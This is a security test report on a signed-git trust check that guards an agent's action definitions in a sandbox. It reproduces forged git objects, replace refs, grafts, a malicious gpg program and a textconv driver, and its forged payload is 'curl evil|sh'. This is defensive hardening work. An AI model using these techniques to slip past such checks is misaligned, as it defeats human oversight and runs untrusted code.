# Trust check attacks (ADR 0002 claims)

- **Checked:** 2026-10-28, on the target host.
- **Versions:** git 2.55.0, gpg / gpgv 2.2.27 (libgcrypt 1.9.4), python3 for writing loose objects.
- **Setup:** throwaway `GNUPGHOME` and repos in a scratch dir, `GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_NOSYSTEM=1`, ed25519 test keys. No network.
- **Fixtures:** `testdata/trust/gen-fixtures.sh OUTDIR` builds one repo per A3 case plus `OUTDIR/cases.json` (see [fixtures](#fixtures)).

`forge` below means: overwrite the loose object file for `oid` with `zlib(type + " " + len + "\0" + new_bytes)`, keeping the old path:

```python
p = f"{repo}/.git/objects/{oid[:2]}/{oid[2:]}"; os.chmod(p, 0o644)
open(p, "wb").write(zlib.compress(typ.encode() + b" %d\0" % len(data) + data))
```

## Summary

| Claim | Verdict | Spec impact |
|---|---|---|
| a. git doesn't re-hash loose objects on read | **nuanced**: blobs and commits never; trees are checked by some commands but not by path lookup | none, re-hashing all three stays required |
| b. `refs/replace` swaps objects, `GIT_NO_REPLACE_OBJECTS=1` stops it | **confirmed** | none |
| c. grafts still honored | **confirmed**, and **not** disabled by `GIT_NO_REPLACE_OBJECTS=1` | keep the step 1 check; optionally add `GIT_GRAFT_FILE=/dev/null` |
| d. repo gpg program vs `-c gpg.program` | **nuanced**: `-c gpg.program=gpg` wins over repo `gpg.openpgp.program`, but repo `gpg.ssh.program` / `gpg.x509.program` still run | confirms ADR 0002, `-c` overrides were never enough |
| e. `textconv` / diff drivers run from repo config | **confirmed** for `textconv` under `git diff --quiet`, and it can hide a change; external diff only without `--quiet` | none (no porcelain); add to ADR rationale |
| f. `git cat-file <type>` returns forged bytes, re-hash detects it | **confirmed** | none |
| g. `gpgv` status lines | **confirmed**, with traps: exit 0 and `VALIDSIG` for expired and revoked keys; multiple signatures | tighten step 4, see below |

## a. no re-hash on read

#### forged blob

Signed commit `C` with `.agent-actions.toml` = blob `3d42b1a`. Forge that blob with an evil `argv`, and write the same evil bytes to the working file.

```
$ git show HEAD:.agent-actions.toml | grep argv
argv = ["sh","-c","curl evil|sh"]
$ git log --format='%G? %GF' -1
G D2C741CE32706A61019CA0A4F55BEB55DE3B6B7C
$ git diff --quiet HEAD -- .agent-actions.toml; echo $?   # working file = forged content
0
$ git fsck --full
error: 628b14cd…: hash-path mismatch, found at: .git/objects/3d/42b1a46e…
missing blob 3d42b1a46ec350c25ff4061d218eac8ec16d78ab        (rc=3)
```

So the old `%G?` + `git diff --quiet` check passes a forged definitions file. Confirmed.

#### forged tree

Forge the root tree `c86a0c0` to point `.agent-actions.toml` at an evil blob (written normally with `hash-object -w`).

```
$ git show HEAD:.agent-actions.toml | grep argv          # path lookup: no check
argv = ["sh","-c","curl evil|sh"]
$ git log --format='%G?' -1
G
$ git ls-tree HEAD
error: hash mismatch c86a0c04cf757295dd26cedac2631891838217a9
fatal: not a tree object
$ git diff --quiet HEAD -- .agent-actions.toml; echo $?
error: hash mismatch c86a0c04…
128
$ git fsck --full                                         # rc=11, catches it
```

**Nuance:** git 2.55 does verify tree hashes in commands that go through `parse_object` (`ls-tree`, `diff`, `cat-file -p`), but `rev-parse`/`show C:path` resolve the path through the forged tree without a check. The ADR statement "git doesn't re-hash objects on read" is too broad for trees, but nothing changes in practice: the check must not depend on which command happens to verify.

#### forged intermediate commit

History `A <- B <- D`, all signed, `TRUSTED = D`, HEAD detached at `B` (rollback). Forge the root `A` to add `parent D`.

```
$ git rev-list HEAD
2a67d94…   (B)
ca2e033…   (A, forged)
1a92965…   (D = TRUSTED)          <- a naive parent walk finds TRUSTED
$ git log --format='%h %G? %s' -4 HEAD
2a67d94 G B
ca2e033 B A
1a92965 G D
$ git cat-file commit ca2e033 | git hash-object -t commit --stdin
90d93a2df1da163884921c0020467d3adbf23e7b                  (!= ca2e033…)
```

`rev-list` follows the forged parent, so the ancestry walk in step 8 must re-hash every commit it reads, as the spec says. `%G?` on the forged commit shows `B`, but step 8 doesn't check intermediate signatures and doesn't need to, the re-hash is enough. `git merge-base --is-ancestor D HEAD` returned 1 here, likely because of the cycle the forgery creates; don't rely on it either way.

- `git fsck` catches all three forgeries, but it walks the whole repo, not usable per request.
- `.git/objects/info/commit-graph`, `.git/shallow` and `.git/objects/info/alternates` are agent-writable too. They steer `rev-list` (tested: `.git/shallow` cuts `HEAD`'s parents), which only affects the step 2 hint.

## b. refs/replace

```
$ git replace 3d42b1a… 628b14c…          # blob -> evil blob
$ git show HEAD:.agent-actions.toml | grep argv
argv = ["sh","-c","curl evil|sh"]
$ git cat-file blob 3d42b1a… | git hash-object --stdin
628b14cd7110ad131ea1d1572525f7527563e7ef  # replacement served under the old id
$ GIT_NO_REPLACE_OBJECTS=1 git cat-file blob 3d42b1a… | git hash-object --stdin
3d42b1a46ec350c25ff4061d218eac8ec16d78ab
$ git --no-replace-objects cat-file blob 3d42b1a… | git hash-object --stdin
3d42b1a46ec350c25ff4061d218eac8ec16d78ab
```

- repo `core.useReplaceRefs=true` does not override the env var (tested).
- replacing the signed commit with an unsigned one: `git log -1 --format='%H %G? %s'` prints the **original** `%H` with `N` and the replacement's subject. With `GIT_NO_REPLACE_OBJECTS=1` it's `G` and the real subject.
- even without the env var, the re-hash catches it (`628b14c` != `3d42b1a`).

Confirmed.

## c. grafts

git 2.55 still honors `.git/info/grafts`, with a deprecation hint on stderr.

```
$ echo "$S $B" > .git/info/grafts             # S's real parent is A
$ git merge-base --is-ancestor $B $S; echo $?
0
$ GIT_NO_REPLACE_OBJECTS=1 git rev-list --parents -1 $S
f03fb33… 8badecf…                             # still grafted
$ git --no-replace-objects rev-list --parents -1 $S
f03fb33… 8badecf…                             # still grafted
$ GIT_GRAFT_FILE=/dev/null git rev-list --parents -1 $S
f03fb33… 12d39d7…                             # real parent
$ git cat-file commit $S | grep parent
parent 12d39d7…                               # raw object unaffected
```

**Implication:** `GIT_NO_REPLACE_OBJECTS=1` does **not** disable grafts. The step 1 precondition is what protects, keep it. Adding `GIT_GRAFT_FILE=/dev/null` to the invocation env closes the check-then-use race on the step 2 hint as well. Since step 8 walks with `cat-file`, grafts can't fake ancestry anyway, only steer the hint.

## d. gpg program precedence

Commit signed with the **foreign** key, `GNUPGHOME` holding only the owner's public key. Fake program prints owner `GOODSIG`/`VALIDSIG` on stdout and exits 0.

```
                                                         %G? %GF
baseline (real gpg)                                      E
repo gpg.openpgp.program=fake                            G D2C741CE…   (fake ran)
repo gpg.openpgp.program=fake, -c gpg.program=gpg        E
repo gpg.openpgp.program=fake, -c gpg.openpgp.program=gpg E
repo gpg.program=fake                                    G D2C741CE…   (fake ran)
repo gpg.program=fake, -c gpg.program=gpg                E
repo gpg.program=fake, -c gpg.openpgp.program=gpg        E
```

git treats `gpg.program` and `gpg.openpgp.program` as one setting, last read wins, and `-c` is read last. So for OpenPGP signatures the command line wins regardless of which name each side uses.

**But** git picks the program by the signature's armor, not by `gpg.format`. A forged commit with a `-----BEGIN SSH SIGNATURE-----` or `-----BEGIN SIGNED MESSAGE-----` `gpgsig` runs repo `gpg.ssh.program` / `gpg.x509.program`, even with `-c gpg.program=gpg`:

```
$ git -c gpg.program=gpg log --format='%G?' -1 $C_ssh
fake ran: -Y find-principals -f …/.git/allowed -s /tmp/.git_vtag_tmp0oyBQ0 -Overify-time=20260101010000
$ git -c gpg.program=gpg log --format='%G?' -1 $C_x509
N
fake x509 ran: --status-fd=1 --verify /tmp/.git_vtag_tmpEpJRNH -
```

With `gpg.ssh.allowedSignersFile` set, the fixture `ssh-program` case gets `%G? = G` from the fake. In the agent's Fence `.git/config` is write-protected, so this needs a config write the agent shouldn't have, but it shows the `-c` override list in the old §8.4 was incomplete. Supports ADR 0002 as is.

## e. textconv / diff drivers

Driver `evil` in `.git/config`, `.agent-actions.toml diff=evil` in `.gitattributes`, the driver appends to a marker file.

```
textconv + diff.evil.command + diff.external configured, file edited:
git diff --quiet HEAD -- f                          rc=1  marker=[]
git diff HEAD -- f                                  rc=0  marker=[extdiff]
git diff --exit-code HEAD -- f                      rc=1  marker=[extdiff]
git diff --quiet --no-textconv --no-ext-diff …      rc=1  marker=[]
git cat-file --textconv HEAD:f                      rc=0  marker=[textconv]

textconv only:
git diff --quiet HEAD -- f                          rc=1  marker=[textconv textconv]
git diff --quiet --no-textconv HEAD -- f            rc=1  marker=[]
git diff --stat HEAD -- f                           rc=0  marker=[]

textconv = `head -n 1`, extra action appended to the working file:
git diff --quiet HEAD -- f                          rc=0  marker=[textconv textconv]   <- edit hidden
git diff --quiet --no-textconv HEAD -- f            rc=1
```

Confirmed, with a nuance: `--quiet` suppresses external diff (`diff.external`, `diff.<driver>.command`) but **not** `textconv`, and a `textconv` that normalizes away the change makes `diff --quiet` report clean. `--no-textconv --no-ext-diff` stops both. `.gitattributes` is agent-writable, the driver definition needs `.git/config` (protected in Fence). The broker compares bytes itself, so no change needed.

## f. cat-file returns forged bytes

```
=== blob 3d42b1a46ec350c25ff4061d218eac8ec16d78ab
cat-file blob rc=0
printf 'blob %d\0' | cat - raw | sha1sum : 628b14cd7110ad131ea1d1572525f7527563e7ef
git hash-object -t blob --stdin          : 628b14cd7110ad131ea1d1572525f7527563e7ef
cat-file --batch                         : 3d42b1a… blob 120
cat-file -p rc=0
=== tree c86a0c04cf757295dd26cedac2631891838217a9
cat-file tree rc=0
sha1sum / hash-object                    : 4d8f06cdc1c52ca0bb57604fcb65de318ce2f54a
cat-file --batch                         : c86a0c0… tree 47
cat-file -p rc=128  error: hash mismatch c86a0c04…
=== commit ca2e0333dee00ea2e743d501df35ac5e6053c8f2
cat-file commit rc=0
sha1sum / hash-object                    : 90d93a2df1da163884921c0020467d3adbf23e7b
cat-file --batch                         : ca2e033… commit 411
cat-file -p rc=0
```

Confirmed: `cat-file <type>` and `--batch` never verify. Hashing `"<type> <len>\0" + bytes` with the **expected** type detects every forgery. Only `cat-file -p` on a tree checks, see a.

## g. gpgv

Payload = commit object minus the `gpgsig` header line and its space-prefixed continuation lines, rest byte-identical (same result as `grep -v '^gpgsig\|^ '` on the header, compared with `cmp`). Signature = the header value with the leading space of each continuation line removed.

```
gpgv --keyring owner.pub --status-fd 1 sig payload
```

#### primary-key signature (rc=0)

```
[GNUPG:] NEWSIG
[GNUPG:] KEY_CONSIDERED D2C741CE32706A61019CA0A4F55BEB55DE3B6B7C 0
[GNUPG:] SIG_ID ILkt7PH63q02Elvn2GoO17FQn8o 2026-10-28 1793193897
[GNUPG:] GOODSIG F55BEB55DE3B6B7C Owner <owner@test>
[GNUPG:] VALIDSIG D2C741CE32706A61019CA0A4F55BEB55DE3B6B7C 2026-10-28 1793193897 0 4 0 22 8 00 D2C741CE32706A61019CA0A4F55BEB55DE3B6B7C
```

#### subkey signature (rc=0)

```
[GNUPG:] GOODSIG 9AFC0264C11EDF21 Sub <sub@test>
[GNUPG:] VALIDSIG 2C8585844EB185CDF38410289AFC0264C11EDF21 2026-10-28 1793193897 0 4 0 22 8 00 B2FA89B6E502ED13CC48E1DC01835761E3EEE182
```

`VALIDSIG` fields after the keyword: `1` signing key fpr, `2` date, `3` sig timestamp, `4` sig expiry, `5` version, `6` reserved, `7` pubkey algo, `8` hash algo, `9` sig class, **`10` primary key fpr**. Compare `PIN` with field 10; field 1 is the subkey for subkey signatures. `GOODSIG` carries the subkey's long key id, not the primary.

#### foreign key (rc=2)

```
[GNUPG:] ERRSIG AD72C905223AB10F 22 8 00 1793193897 9 9801A69633B1B1FCDF1E4C7BAD72C905223AB10F
[GNUPG:] NO_PUBKEY AD72C905223AB10F
```

#### expired key, signature made while valid (rc=0!)

```
[GNUPG:] KEYEXPIRED 1735776000
[GNUPG:] EXPKEYSIG D02214EEA0C260D8 Exp2 <exp2@test>
[GNUPG:] VALIDSIG 46AB244DCF1C13F77E3A8A2FD02214EEA0C260D8 2025-01-01 1735732800 0 4 0 22 8 00 46AB244DCF1C13F77E3A8A2FD02214EEA0C260D8
```

#### revoked key (rc=0!)

```
[GNUPG:] REVKEYSIG E5F34B5D28A700F6 Rev <rev@test>
[GNUPG:] VALIDSIG 60F0EEC97EA64E376652C184E5F34B5D28A700F6 2026-10-28 1793193912 0 4 0 22 8 00 60F0EEC97EA64E376652C184E5F34B5D28A700F6
```

#### two signatures in one gpgsig (owner + foreign, rc=2)

```
[GNUPG:] NEWSIG
[GNUPG:] GOODSIG F55BEB55DE3B6B7C Owner <owner@test>
[GNUPG:] VALIDSIG D2C741CE… … D2C741CE…
[GNUPG:] NEWSIG
[GNUPG:] ERRSIG AD72C905223AB10F …
[GNUPG:] NO_PUBKEY AD72C905223AB10F
```

- `gpgv --keyring owner.pub` does **not** also load `$GNUPGHOME/trustedkeys.gpg` (tested with the foreign key planted there: `NO_PUBKEY`).
- for an expired key, signing fails (`Unusable secret key`), so the expired fixture signs with `--faked-system-time` while the key was valid.

**Implication for step 4.** The exit code and "`VALIDSIG` with fpr = `PIN`" alone accept expired and revoked keys. Step 4 as written ("require `GOODSIG` … no other status may indicate expiry or revocation") is right, make it exact:

- exit code 0,
- exactly one `NEWSIG`,
- exactly one `GOODSIG` and exactly one `VALIDSIG`, field 10 == `PIN`,
- none of `BADSIG`, `ERRSIG`, `EXPSIG`, `EXPKEYSIG`, `REVKEYSIG`, `KEYEXPIRED`, `KEYREVOKED`, `NO_PUBKEY`.

## spec implications

- step 4: tighten as above (exit 0, single `NEWSIG`, field 10, explicit reject list). Pass `KEYRING` as an absolute path: per gpgv(1) a name without a slash is looked up in the homedir (not tested here).
- step 3: strip only a header named exactly `gpgsig` and fail on more than one. Other headers (e.g. `gpgsig-sha256`, `mergetag`) stay in the payload, which is what git signs.
- step 1: say explicitly that `GIT_NO_REPLACE_OBJECTS=1` doesn't cover grafts. Consider `GIT_GRAFT_FILE=/dev/null` in the invocation env.
- step 2: the hint can also be steered by `.git/shallow` and `commit-graph`. Harmless since steps 3–8 verify `C` and walk with `cat-file`, worth one line in the notes.
- step 5: mode `100755` fails (fixture `mode-100755`, reason "file mode"), matching "the mode must be `100644`".
- §9 A3: add expired key, revoked key, SSH-armored signature with repo `gpg.ssh.program`, a SHA-256 repo and mode `100755`. The generator already covers them.
- ADR 0002: the `-c gpg.program` route was also incomplete for SSH/X.509 signatures (d), and `textconv` can hide an edit from `diff --quiet` (e). Good additions to "Considered Options".
- reason strings: the spec only names "uncommitted edits" and "rollback". The fixtures also use "signature status", "foreign key", "hash mismatch", "grafts present", "unsupported object format", "symlink", "file mode". Fix them in §8.4 if the Go tests should match on them.

## fixtures

`testdata/trust/gen-fixtures.sh OUTDIR` (needs git, gpg 2.2+, python3, an empty `OUTDIR`). Creates `OUTDIR/gnupg` (symlinked from a short `$TMPDIR` path when `OUTDIR` is too long for the gpg-agent socket), `OUTDIR/keys/<name>.gpg` (one public key each), one repo per case and `OUTDIR/cases.json`:

```json
{"name": "rollback", "repo": "rollback", "expect": "fail", "reason": "rollback",
 "pin": "<primary fpr>", "keyring": "keys/owner.gpg", "trusted": "<commit id>", "marker": null}
```

`marker` set => the test asserts `OUTDIR/<marker>` doesn't exist after verification (repo-configured program must not run).

| Case | Expect | Reason |
|---|---|---|
| `signed-clean` | pass | |
| `subkey-signed` | pass | |
| `unsigned-head-other-file` | pass | |
| `accepted-descendant` | pass (`trusted` = ancestor) | |
| `gpg-program-owner` | pass, marker | |
| `uncommitted-edit` | fail | uncommitted edits |
| `unsigned-commit` | fail | signature status |
| `foreign-key` | fail | foreign key |
| `expired-key` | fail | signature status |
| `revoked-key` | fail | signature status |
| `replace-ref` | fail | uncommitted edits |
| `grafts` | fail | grafts present |
| `sha256-repo` | fail | unsupported object format |
| `rollback` | fail (`trusted` = newer commit) | rollback |
| `forged-blob` | fail | hash mismatch |
| `forged-tree` | fail | hash mismatch |
| `forged-intermediate-commit` | fail (`trusted` = newer commit) | hash mismatch |
| `gpg-program-foreign` | fail, marker | foreign key |
| `ssh-program` | fail, marker | signature status |
| `textconv` | fail, marker | uncommitted edits |
| `symlink-committed` | fail | symlink |
| `symlink-worktree` | fail | symlink |
| `mode-100755` | fail | file mode |

Validated twice: a throwaway Python implementation of §8.4 (with the step 4 rules above) matched all 23 expectations with no marker touched, and the old porcelain check (`%G?` + `git diff --quiet`) gets fooled by `forged-blob`, `replace-ref`, `textconv`, `gpg-program-foreign` and `ssh-program` (`%G?` `G`/`U`, `diff --quiet` 0, three markers touched).
